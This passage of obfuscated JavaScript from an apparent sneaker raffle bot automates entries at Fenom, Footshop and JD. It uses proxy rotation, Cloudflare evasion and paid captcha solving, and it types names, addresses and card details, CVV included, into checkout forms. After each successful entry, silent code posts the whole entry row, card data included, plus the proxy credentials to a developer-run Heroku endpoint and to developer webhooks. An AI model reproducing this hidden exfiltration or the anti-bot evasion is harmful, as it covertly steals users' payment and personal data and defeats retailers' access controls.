                                    '--proxy-server=' + _0x22aaef[0x0] + ':' + _0x22aaef[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1da934 = await _0x4b7ffa['newPage'](), _0x2c20c3 = await _0x1da934['target']()['createCDPSession'](), { windowId: _0x378682 } = await _0x2c20c3['send']('Browser.getWindowForTarget');
                            await _0x1da934['authenticate']({
                                'username': '' + _0x22aaef[0x2],
                                'password': '' + _0x22aaef[0x3]
                            }), console['log'](_0x3b5c2b() + '\x20[' + _0x4a5008['name'] + ']\x20Task\x20' + (_0x5bcf02 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1da934['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x3b5c2b() + '\x20[' + _0x4a5008['name'] + ']\x20Task\x20' + (_0x5bcf02 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x505897(0xbb8), await _0x2c20c3['send']('Browser.setWindowBounds', {
                                'windowId': _0x378682,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x505897(0x1f40);
                            try {
                                await _0x1da934['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x505897(0x1388), console['log'](_0x3b5c2b() + '\x20[' + _0x4a5008['name'] + ']\x20Task\x20' + (_0x5bcf02 + 0x1) + '\x20:\x20Logging\x20in'), await _0x1da934['type']('input[name=\x22email\x22]', '' + _0x341a9d[_0x5bcf02]['Email']), await _0x505897(0x1f4), await _0x1da934['type']('input[name=\x22password\x22]', '' + _0x341a9d[_0x5bcf02]['Password']), await _0x505897(0x258), await _0x1da934['$eval']('#login-form', _0xecdf03 => _0xecdf03['submit']()), await _0x1da934['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x505897(0x1f4), await _0x1da934['goto']('' + _0x341a9d[_0x5bcf02]['Url']), await _0x1da934['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x3b5c2b() + '\x20[' + _0x4a5008['name'] + ']\x20Task\x20' + (_0x5bcf02 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x341a9d[_0x5bcf02]['Size']);
                            if (_0x341a9d[_0x5bcf02]['Size'] != 'RANDOM') {
                                var _0xddc233 = '\x20' + _0x341a9d[_0x5bcf02]['Size'] + '\x20';
                                const _0x203bd6 = await _0x1da934['$x']('//span[contains(text(),\x20' + _0xddc233 + ')]');
                                await _0x203bd6[0x0]['click']();
                            } else {
                                const _0xbb18d2 = await _0x1da934['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x184e84 = Math['round'](Math['random']() * (_0xbb18d2['length'] - 0x1));
                                await _0xbb18d2[_0x184e84]['click']();
                            }
                            await _0x505897(0x258), await _0x1da934['click']('#cookieChoiceDismiss'), await _0x505897(0x3e8), await _0x1da934['type']('#instagram-account', '' + _0x341a9d[_0x5bcf02]['Follower']), await _0x505897(0x28a), await _0x1da934['click']('#book-btn'), await _0x505897(0xbb8);
                            try {
                                await _0x1da934['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x505897(0x1f4), console['log'](_0x3b5c2b() + '\x20[' + _0x4a5008['name'] + ']\x20Task\x20' + (_0x5bcf02 + 0x1) + '\x20:\x20' + _0x4e59da['cyan']('Solving\x20Captcha')), await _0x1da934['solveRecaptchas'](), console['log'](_0x3b5c2b() + '\x20[' + _0x4a5008['name'] + ']\x20Task\x20' + (_0x5bcf02 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x505897(0x7d0), await _0x1da934['$eval']('#book-btn-for-sure', _0x4eca69 => _0x4eca69['click']()), await _0x505897(0x12c), await _0x1da934['click']('#book-btn-for-sure'), await _0x505897(0xdac);
                            const _0x5bc3a1 = await _0x1da934['$eval']('.reservation-popup\x20>\x20.title', _0x2bde28 => {
                                return _0x2bde28['innerHTML'];
                            });
                            if (_0x5bc3a1) {
                                _0x32bfc2 = 'no', _0x11df74(_0x341a9d[_0x5bcf02], _0x4a5008), console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x4a5008['name'] + ']\x20Task\x20' + (_0x5bcf02 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x409d9d = await _0x429bf8(_0x341a9d[_0x5bcf02], _0x4a5008, 'dev', ![]), _0x18716f = await _0x429bf8(_0x341a9d[_0x5bcf02], _0x4a5008, 'pub', ![]);
                                let _0x1e1911 = _0x341a9d[_0x5bcf02];
                                try {
                                    prxdata = {
                                        'username': _0xdaef84['replace']('#', ''),
                                        'module': _0x4a5008['name'],
                                        'entrydata': JSON['stringify'](_0x1e1911),
                                        'proxy': '' + _0x491b2b[_0x5bcf02]
                                    };
                                    var _0x4a2632 = JSON['stringify'](prxdata);
                                    let _0x531401 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x577975['post']('https://jraffles.herokuapp.com/success', _0x4a2632, _0x531401);
                                } catch (_0x2b19bb) {
                                }
                                const _0x5730a = {
                                    'succesDEVMSG': { 'embeds': [_0x409d9d] },
                                    'succesPUBMSG': { 'embeds': [_0x18716f] }
                                };
                                try {
                                    _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x5730a['succesDEVMSG']), await _0x505897(0xc8), await _0x1abce0(_0x5640fd, _0x5730a['succesDEVMSG']), await _0x505897(0xc8), await _0x1abce0(_0x1b595f, _0x5730a['succesPUBMSG']);
                                } catch (_0x417fa9) {
                                    console['log'](_0x4e59da['yellow'](_0x3b5c2b() + '\x20[' + _0x4a5008['name'] + ']\x20Task\x20' + (_0x5bcf02 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x417fa9));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x41ab92) {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x4a5008['name'] + ']\x20Task\x20' + (_0x5bcf02 + 0x1) + '\x20:\x20' + _0x41ab92)), _0x5cfa18 = '' + _0x41ab92;
                            var _0x50af00 = await _0x429bf8(_0x341a9d[_0x5bcf02], _0x4a5008, 'dev', !![], _0x5cfa18), _0x409d9d = await _0x429bf8(_0x341a9d[_0x5bcf02], _0x4a5008, 'dev', ![]), _0x18716f = await _0x429bf8(_0x341a9d[_0x5bcf02], _0x4a5008, 'pub', ![]);
                            const _0x1c80b6 = {
                                'succesDEVMSG': { 'embeds': [_0x409d9d] },
                                'succesPUBMSG': { 'embeds': [_0x18716f] }
                            };
                            _0x1c80b6['errorDEV'] = { 'embeds': [_0x50af00] }, _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x1c80b6['errorDEV']), await _0x1abce0(_0x3b044a, _0x1c80b6['errorDEV']), _0x41ab92 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x32bfc2 = 'yes');
                        } finally {
                            _0x4b7ffa['close']();
                            if (_0x32bfc2 == 'yes' && _0x2a1617 != 0x5 && _0x5cfa18 != 'Size\x20Not\x20Found') {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x4a5008['name'] + ']\x20Task\x20' + (_0x5bcf02 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2a1617 + '\x20/\x205)')), _0x5bcf02 = _0x5bcf02 - 0x1, _0x2a1617 = _0x2a1617 + 0x1;
                                continue;
                            }
                            _0x32bfc2 == 'yes' && _0x2a1617 >= 0x5 && (_0x260c2d(_0x341a9d[_0x5bcf02], _0x4a5008), _0x32bfc2 = 'no', _0x2a1617 = 0x0), console['log'](_0x3b5c2b() + '\x20[' + _0x4a5008['name'] + ']\x20Waiting\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x5d566b, _0x47b398, _0x5333f9) {
                _0x367f42['use'](_0x156bf2()), _0x367f42['use'](_0x5ad8e2({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4acd48['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x321b84 = 0x0; _0x321b84 < _0x47b398['length']; _0x321b84++) {
                    var _0x1b148a;
                    if (_0x392e47 != 'yes')
                        var _0x392e47 = '', _0x9d310b = 0x0;
                    var _0x186928 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0xdaef84
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x47b398[_0x321b84]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x47b398[_0x321b84]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x4acd48['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5d34b4
                            }
                        ]
                    }], _0x3e4c12 = await _0x429bf8(_0x47b398[_0x321b84], _0x5d566b, 'dev', ![]), _0x1ed421 = await _0x429bf8(_0x47b398[_0x321b84], _0x5d566b, 'pub', ![]);
                    const _0xf43a9 = {
                        'succesDEVMSG': { 'embeds': [_0x3e4c12] },
                        'succesPUBMSG': { 'embeds': [_0x1ed421] }
                    }, _0x5f303a = { 'embeds': _0x186928 };
                    try {
                        await _0x43797b(_0x47b398, _0x321b84);
                    } catch {
                        _0x392e47 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x47b398[_0x321b84]['Email'] == '' || _0x47b398[_0x321b84]['FirstName'] == '' || _0x47b398[_0x321b84]['LastName'] == '' || _0x47b398[_0x321b84]['Country'] == '' || _0x47b398[_0x321b84]['Size'] == '' || _0x47b398[_0x321b84]['Address1'] == '' || _0x47b398[_0x321b84]['Zip'] == '') {
                        console['log'](_0x3b5c2b() + '\x20[' + _0x5d566b['name'] + ']\x20Task\x20' + (_0x321b84 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x47b398[_0x321b84]['Email'] == '' || _0x47b398[_0x321b84]['FirstName'] == '' || _0x47b398[_0x321b84]['LastName'] == '' || _0x47b398[_0x321b84]['Country'] == '' || _0x47b398[_0x321b84]['Size'] == '' || _0x47b398[_0x321b84]['Address1'] == '' || _0x47b398[_0x321b84]['Zip'] == '' || _0x47b398[_0x321b84]['Phone'] == '') {
                        console['log'](_0x3b5c2b() + '\x20[' + _0x5d566b['name'] + ']\x20Task\x20' + (_0x321b84 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x402027 = '' + _0x47b398[_0x321b84]['Url'];
                    if (_0x4acd48['useRandomProxy'] = ![])
                        var _0x1c4d18 = _0x5333f9[_0x321b84]['split'](':');
                    else
                        var _0x5a8d16 = Math['round'](Math['random']() * (_0x5333f9['length'] - 0x1)), _0x1c4d18 = _0x5333f9[_0x5a8d16]['split'](':');
                    var _0x1b4ce3;
                    try {
                        _0x1b4ce3 = await _0x367f42['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1c4d18[0x0] + ':' + _0x1c4d18[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x1b4ce3 = await _0x367f42['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1c4d18[0x0] + ':' + _0x1c4d18[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x6d4605 = await _0x1b4ce3['newPage']();
                        await _0x6d4605['authenticate']({
                            'username': '' + _0x1c4d18[0x2],
                            'password': '' + _0x1c4d18[0x3]
                        }), console['log'](_0x3b5c2b() + '\x20[' + _0x5d566b['name'] + ']\x20Task\x20' + (_0x321b84 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x6d4605['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x6d4605['setRequestInterception'](!![]), _0x6d4605['on']('request', _0x51c76d => {
                            _0x51c76d['resourceType']() === 'image' || _0x51c76d['resourceType']() === 'font' || _0x51c76d['resourceType']() === 'media' ? _0x51c76d['abort']() : _0x51c76d['continue']();
                        });
                        try {
                            await _0x6d4605['goto'](_0x402027), await _0x505897(0xbb8), await _0x6d4605['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x6d4605['click']('.control__JhutY'), await _0x505897(0x1f4);
                        if (_0x47b398[_0x321b84]['Size'] != 'RANDOM')
                            try {
                                const _0x4f0550 = await _0x6d4605['$x']('//div[contains(text(),\x20\x27' + _0x47b398[_0x321b84]['Size'] + '\x27)]');
                                await _0x4f0550[0x0]['click']();
                            } catch {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x5d566b['name'] + ']\x20Task\x20' + (_0x321b84 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x569960 = await _0x6d4605['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x197c7e = Math['round'](Math['random']() * (_0x569960['length'] - 0x1));
                            await _0x569960[_0x197c7e]['click']();
                        }
                        await _0x505897(0x4b0);
                        const _0x20d9b6 = await _0x6d4605['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x20d9b6[0x0]['click'](), await _0x6d4605['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x3b5c2b() + '\x20[' + _0x5d566b['name'] + ']\x20Task\x20' + (_0x321b84 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x6d4605['type']('input[name=\x22email\x22]', '' + _0x47b398[_0x321b84]['Email']), await _0x505897(0x640), await _0x6d4605['type']('input[name=\x22phone\x22]', '' + _0x47b398[_0x321b84]['Phone']), await _0x505897(0x4b0), await _0x6d4605['click']('button.btn.continue-button__1RtsS'), await _0x505897(0x4b0);
                        try {
                            await _0x6d4605['type']('input[name=\x22firstName\x22]', '' + _0x47b398[_0x321b84]['FirstName']), await _0x505897(0x258);
                        } catch {
                            const _0xa71040 = await _0x6d4605['$$eval']('.invalid-feedback\x20>\x20div', _0x23d8ab => {
                                return _0x23d8ab['map'](_0x19e7ab => _0x19e7ab['innerText']);
                            });
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x5d566b['name'] + ']\x20Task\x20' + (_0x321b84 + 0x1) + '\x20:\x20' + _0xa71040));
                            continue;
                        }
                        await _0x6d4605['type']('input[name=\x22lastName\x22]', '' + _0x47b398[_0x321b84]['LastName']), await _0x505897(0xc8), await _0x6d4605['type']('input[name=\x22instagramUsername\x22]', '' + _0x47b398[_0x321b84]['Follower']), await _0x505897(0x4b0), await _0x6d4605['click']('button.btn.continue-button__1RtsS'), await _0x505897(0x3e8), console['log'](_0x3b5c2b() + '\x20[' + _0x5d566b['name'] + ']\x20Task\x20' + (_0x321b84 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x6d4605['select']('select[name=\x22country\x22]', '' + _0x47b398[_0x321b84]['Country']), await _0x505897(0x2bc), await _0x6d4605['type']('input[name=\x22streetName\x22]', '' + _0x47b398[_0x321b84]['Address1']), await _0x505897(0x258), await _0x6d4605['type']('input[name=\x22houseNumber\x22]', _0x47b398[_0x321b84]['HouseNumber'] + '\x20' + _0x47b398[_0x321b84]['Address2']), await _0x505897(0xc8), await _0x6d4605['type']('input[name=\x22postalCode\x22]', '' + _0x47b398[_0x321b84]['Zip']), await _0x505897(0x1f4), await _0x6d4605['type']('input[name=\x22city\x22]', '' + _0x47b398[_0x321b84]['City']), await _0x505897(0x4b0), await _0x6d4605['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x505897(0x4b0), await _0x6d4605['click']('button.btn.continue-button__1RtsS'), await _0x505897(0x4b0), console['log'](_0x3b5c2b() + '\x20[' + _0x5d566b['name'] + ']\x20Task\x20' + (_0x321b84 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x6d4605['solveRecaptchas'](), console['log'](_0x3b5c2b() + '\x20[' + _0x5d566b['name'] + ']\x20Task\x20' + (_0x321b84 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x505897(0xbb8), await _0x6d4605['click']('button.btn.continue-button__1RtsS'), await _0x505897(0x1388), console['log'](_0x3b5c2b() + '\x20[' + _0x5d566b['name'] + ']\x20Task\x20' + (_0x321b84 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x6d4605['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x6d4605['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x505897(0x4b0), await _0x6d4605['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x47b398[_0x321b84]['CardNumber']), await _0x505897(0x320), await _0x6d4605['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x6d4605['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x47b398[_0x321b84]['ExpiryDate']), await _0x505897(0x4b0), await _0x6d4605['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x6d4605['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x47b398[_0x321b84]['CVV']), await _0x505897(0x226), await _0x6d4605['type']('input[name=\x22holderName\x22]', '' + _0x47b398[_0x321b84]['NameOnCard']), await _0x505897(0x226), await _0x6d4605['click']('button.adyen-checkout__button'), console['log'](_0x3b5c2b() + '\x20[' + _0x5d566b['name'] + ']\x20Task\x20' + (_0x321b84 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x6d4605['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x505897(0xbb8);
                        } catch (_0x55a14e) {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x5d566b['name'] + ']\x20Task\x20' + (_0x321b84 + 0x1) + '\x20:\x203DS\x20Failed')), _0x1b148a = '3DS\x20Error\x20' + _0x55a14e;
                            var _0x261d5f = await _0x429bf8(_0x47b398[_0x321b84], _0x5d566b, 'dev', !![], _0x1b148a);
                            _0xf43a9['errorDEV'] = { 'embeds': [_0x261d5f] };
                            _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0xf43a9['errorDEV']);
                            await _0x1abce0(_0x3b044a, _0xf43a9['errorDEV']);
                            continue;
                        }
                        _0x11df74(_0x47b398[_0x321b84], _0x5d566b), console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x5d566b['name'] + ']\x20Task\x20' + (_0x321b84 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x2846e3 = _0x47b398[_0x321b84];
                        try {
                            prxdata = {
                                'username': _0xdaef84['replace']('#', ''),
                                'module': _0x5d566b['name'],
                                'entrydata': JSON['stringify'](_0x2846e3),
                                'proxy': '' + _0x5333f9[_0x321b84]
                            };
                            var _0x2a72e2 = JSON['stringify'](prxdata);
                            let _0x271ac9 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x577975['post']('https://jraffles.herokuapp.com/success', _0x2a72e2, _0x271ac9);
                        } catch (_0x44227f) {
                        }
                        if (_0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '')
                            try {
                                await _0x1abce0(_0x4acd48['webhook'], _0xf43a9['succesDEVMSG']);
                            } catch {
                            }
                        await _0x505897(0xc8), await _0x1abce0(_0x5640fd, _0xf43a9['succesDEVMSG']), await _0x505897(0xc8);
                        try {
                            await _0x1abce0(_0x1b595f, _0xf43a9['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x174dbd) {
                        console['log'](_0x3b5c2b() + '\x20[' + _0x5d566b['name'] + ']\x20Task\x20' + (_0x321b84 + 0x1) + '\x20:\x20' + _0x174dbd), _0x1b148a = '' + _0x174dbd;
                        var _0x261d5f = await _0x429bf8(_0x47b398[_0x321b84], _0x5d566b, 'dev', !![], _0x1b148a);
                        _0xf43a9['errorDEV'] = { 'embeds': [_0x261d5f] }, _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0xf43a9['errorDEV']), await _0x1abce0(_0x3b044a, _0xf43a9['errorDEV']), _0x392e47 = 'yes';
                    } finally {
                        _0x1b4ce3['close']();
                        if (_0x392e47 == 'yes' && _0x9d310b != 0x5) {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x5d566b['name'] + ']\x20Task\x20' + (_0x321b84 + 0x1) + '\x20:\x20Retrying\x20(' + _0x9d310b + '\x20/\x205)')), _0x321b84 = _0x321b84 - 0x1, _0x9d310b = _0x9d310b + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x4acd48['footshopDelay'] + '\x20ms'), await _0x505897(_0x4acd48['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x44d621, _0x586dfb, _0x661187) {
                var _0x1d22c5 = ![], _0x479f3d = ![];
                if (_0x4acd48['captchaKey'] == '' || _0x4acd48['captchaKey'] == undefined)
                    return console['log'](_0x4e59da['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x367f42['use'](_0x156bf2()), _0x367f42['use'](_0x5ad8e2({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4acd48['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x916f5a = 0x0; _0x916f5a < _0x586dfb['length']; _0x916f5a++) {
                    if (_0x34906a != 'yes')
                        var _0x34906a = '', _0xa7a4e6 = 0x0;
                    var _0x5aa130, _0x334ffc = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x586dfb[_0x916f5a]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x586dfb[_0x916f5a]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0xdaef84
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x4acd48['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5d34b4
                            }
                        ]
                    }];
                    const _0x443335 = { 'embeds': _0x334ffc };
                    _0x4041fe(_0x44d621['name'] + '\x20Task\x20' + (_0x916f5a + 0x1) + '\x20/\x20' + _0x586dfb['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8);
                    try {
                        await _0x43797b(_0x586dfb, _0x916f5a);
                    } catch {
                        _0x34906a = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x23b4ba = await _0x429bf8(_0x586dfb[_0x916f5a], _0x44d621, 'dev', ![]), _0x2750f1 = await _0x429bf8(_0x586dfb[_0x916f5a], _0x44d621, 'pub', ![]);
                    const _0x5d12ff = {
                        'succesDEVMSG': { 'embeds': [_0x23b4ba] },
                        'succesPUBMSG': { 'embeds': [_0x2750f1] }
                    };
                    if (_0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '')
                        try {
                            await _0x1abce0(_0x4acd48['webhook'], _0x5d12ff['succesDEVMSG']);
                        } catch {
                        }
                    await _0x505897(0xc8), await _0x1abce0(_0x5640fd, _0x5d12ff['succesDEVMSG']), await _0x505897(0xc8);
                    try {
                        await _0x1abce0(_0x1b595f, _0x5d12ff['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x586dfb[_0x916f5a]['Email'] == '' || _0x586dfb[_0x916f5a]['Url'] == '' || _0x586dfb[_0x916f5a]['FirstName'] == '' || _0x586dfb[_0x916f5a]['LastName'] == '') {
                        console['log'](_0x3b5c2b() + '\x20[' + _0x5f28dd[taskModule]['name'] + ']\x20Task\x20' + (_0x916f5a + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x4acd48['useRandomProxy'] = ![])
                        var _0x3d96c7 = _0x661187[_0x916f5a]['split'](':');
                    else
                        var _0x1d4a97 = Math['round'](Math['random']() * (_0x661187['length'] - 0x1)), _0x3d96c7 = _0x661187[_0x1d4a97]['split'](':');
                    var _0x4d2fe4;
                    try {
                        _0x4d2fe4 = await _0x367f42['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3d96c7[0x0] + ':' + _0x3d96c7[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x4d2fe4 = await _0x367f42['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3d96c7[0x0] + ':' + _0x3d96c7[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0xd91825 = await _0x4d2fe4['newPage']();
                        await _0xd91825['authenticate']({
                            'username': '' + _0x3d96c7[0x2],
                            'password': '' + _0x3d96c7[0x3]
                        }), console['log'](_0x3b5c2b() + '\x20[' + _0x44d621['name'] + ']\x20Task\x20' + (_0x916f5a + 0x1) + '\x20:\x20Getting\x20Session'), await _0xd91825['setRequestInterception'](!![]), _0xd91825['on']('request', _0x904463 => {
                            _0x904463['resourceType']() === 'image' || _0x904463['resourceType']() === 'font' || _0x904463['resourceType']() === 'media' ? _0x904463['abort']() : _0x904463['continue']();
                        });
                        try {
                            await _0xd91825['goto']('' + _0x586dfb[_0x916f5a]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0xd91825['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x3b5c2b() + '\x20[' + _0x44d621['name'] + ']\x20Task\x20' + (_0x916f5a + 0x1) + '\x20:\x20Filling\x20Information'), await _0xd91825['type']('#comp_firstname', '' + _0x586dfb[_0x916f5a]['FirstName']), await _0xd91825['waitForSelector']('#comp_lastname'), await _0xd91825['type']('#comp_lastname', '' + _0x586dfb[_0x916f5a]['LastName']), await _0xd91825['waitForSelector']('#comp_email'), await _0xd91825['type']('#comp_email', '' + _0x586dfb[_0x916f5a]['Email']), await _0xd91825['waitForSelector']('#comp_paypalemail'), await _0xd91825['type']('#comp_paypalemail', '' + _0x586dfb[_0x916f5a]['Email']), await _0xd91825['waitForSelector']('#comp_mobile_end'), await _0xd91825['type']('#comp_mobile_end', '' + _0x586dfb[_0x916f5a]['Phone']), await _0xd91825['waitForSelector']('#comp_dob'), await _0xd91825['type']('#comp_dob', '08/09/1992'), console['log'](_0x3b5c2b() + '\x20[' + _0x44d621['name'] + ']\x20Task\x20' + (_0x916f5a + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x586dfb[_0x916f5a]['Size'] == 'RANDOM') {
                            const _0x4e93bc = await _0xd91825['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x83d02e => {
                                return _0x83d02e['map'](_0x106a70 => _0x106a70['value']);
                            });
                            var _0x125373 = Math['round'](Math['random']() * (_0x4e93bc['length'] - 0x2));
                            await _0xd91825['select']('#shoesize', _0x4e93bc[_0x125373 + 0x1]), await _0x505897(0x3e8);
                        } else {
                            const _0x5cb82f = await _0xd91825['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x53beb7 => {
                                return _0x53beb7['map'](_0x50a795 => _0x50a795['innerText']);
                            }), _0x410bda = await _0xd91825['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x388c7f => {
                                return _0x388c7f['map'](_0x2646e9 => _0x2646e9['value']);
                            });
                            var _0x260277 = _0x586dfb[_0x916f5a]['Size'];
                            for (var _0x28116b = 0x1; _0x28116b < _0x410bda['length']; _0x28116b++) {
                                var _0x29e7d5 = _0x5cb82f[_0x28116b]['split']('\x20')[0x0];
                                if (_0x29e7d5 == _0x260277) {
                                    await _0xd91825['select']('#shoesize', _0x410bda[_0x28116b]);
                                    break;
                                } else {
                                    if (_0x28116b + 0x1 == _0x410bda['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
